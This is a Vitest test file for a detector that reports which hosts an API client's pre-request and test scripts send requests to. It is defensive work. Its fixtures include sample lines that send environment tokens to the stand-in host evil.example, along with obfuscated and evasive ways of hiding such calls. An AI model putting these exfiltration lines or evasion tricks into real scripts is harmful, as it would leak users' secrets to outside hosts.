import { describe, expect, it } from "vitest"
import { scriptSends } from "../script-hosts"

describe("scriptSends", () => {
  it.each([
    ["hopp.fetch('https://evil.example/?' + pw.env.get('token'))"],
    ["await fetch(`https://evil.example/users/${pw.env.get('id')}`)"],
    [
      "const r = await hopp.fetch(\"https://EVIL.example:443/x\", { method: 'POST' })",
    ],
    ["pm.sendRequest('https://evil.example', () => {})"],
    ["pm.sendRequest({ method: 'POST', url: 'https://evil.example/t' }, cb)"],
    ["hopp.fetch('https://evil\\x2eexample/')"],
    ["new WebSocket('wss://evil.example/socket')"],
    ["import x from 'https://evil.example/mod.js'"],
    ["const v = `${await hopp.fetch('https://evil.example/')}`"],
    ["const re = /\"/; hopp.fetch('https://evil.example/')"],
    ["hopp.f\\u0065tch('https://evil.example/')"],
    ["hopp.fetch?.('https://evil.example/')"],
    // Inside brackets, an operator can't pick another value.
    ["hopp.fetch('https://evil.example/' + (a ? b : c))"],
    // Division, not a regex swallowing the call.
    [
      "const a = {} / 1; hopp.fetch('https://evil.example/?' + pw.env.get('token')); const b = 1 / 1",
    ],
    [
      "let x = 1; x++ / 1; hopp.fetch('https://evil.example/?' + pw.env.get('token')); x / 1",
    ],
    [
      "const f = function () {} / 1; hopp.fetch('https://evil.example/'); 1 / 1",
    ],
    // A regex, not a division opening a string that swallows the call.
    [
      "if (1) /'/.test(''); hopp.fetch(\"https://evil.example/?\" + pw.env.get(\"token\")); const x = '' // '",
    ],
    ["if (a(b)) /'/.test(x); hopp.fetch('https://evil.example/') // '"],
  ])("names the host in %s", (script) => {
    expect(scriptSends(script)).toEqual({ hosts: ["evil.example"], unknown: 0 })
  })

  it.each([
    ["hopp.fetch(pw.env.get('url'))"],
    ["hopp.fetch('https://' + pw.env.get('host') + '/x')"],
    ["hopp.fetch(`https://${host}/x`)"],
    ["hopp.fetch('https://evil' + '.example/')"],
    ["hopp.fetch('/relative')"],
    ["const f = hopp.fetch; f('https://evil.example/')"],
    ["hopp['fe' + 'tch']('https://evil.example/')"],
    ["hopp['fetch']('https://evil.example/')"],
    ["pm.sendRequest({ url }, cb)"],
    ["eval(code)"],
    ["import(pw.env.get('mod'))"],
    ["new XMLHttpRequest()"],
    ["[].constructor.constructor('return hopp')()"],
    // An operator after the prefix picks the value.
    ["hopp.fetch('https://api.example/' + 1 ? 'https://evil.example/' : 0)"],
    ["hopp.fetch('https://api.example/' + x || y)"],
    ["hopp.fetch('https://api.example/' + x - 1)"],
    // A later key overrides the first `url`.
    ["pm.sendRequest({ url: 'https://api.example/', url: u }, cb)"],
    ["pm.sendRequest({ url: 'https://api.example/', ...o }, cb)"],
    ["pm.sendRequest({ url: 'https://api.example/', ['url']: u }, cb)"],
    ["pm.sendRequest({ url: 'https://api.example/' } || o, cb)"],
    // The object that sends, passed on.
    ["const o = hopp; Object.values(o)[0]('https://evil.example/')"],
    ["Object.values(this)[0]('https://evil.example/')"],
    ["const { sendRequest: s } = pm"],
    // A literal that reads like a call may hide a misread one.
    ["const s = 'hopp.fetch(\"https://evil.example/\")'"],
  ])("can't tell where %s sends", (script) => {
    expect(scriptSends(script).unknown).toBeGreaterThan(0)
  })

  it.each([
    [""],
    ["pw.env.set('token', pw.response.body.token)"],
    ["pw.test('fetch works', () => pw.expect(pw.response.status).toBe(200))"],
    ["// hopp.fetch('https://evil.example/')\n/* fetch(x) */ const a = 1 / 2"],
    [
      [
        "const body = pw.response.body",
        "if (body?.items?.length > 0) { pw.env.set('id', body.items[0].id) }",
        "/token=(\\w+)/.test(body.raw) && hopp.env.set('seen', 'yes')",
        "const avg = { n: body.total }.n / body.count / 2",
        "pm.environment.set('avg', String(avg))",
      ].join("\n"),
    ],
  ])("sees no call in %s", (script) => {
    expect(scriptSends(script)).toEqual({ hosts: [], unknown: 0 })
  })

  it("counts each unreadable call", () => {
    expect(
      scriptSends(
        "hopp.fetch('https://a.example/'); hopp.fetch(u); pm.sendRequest(v)"
      )
    ).toEqual({ hosts: ["a.example"], unknown: 2 })
  })
})
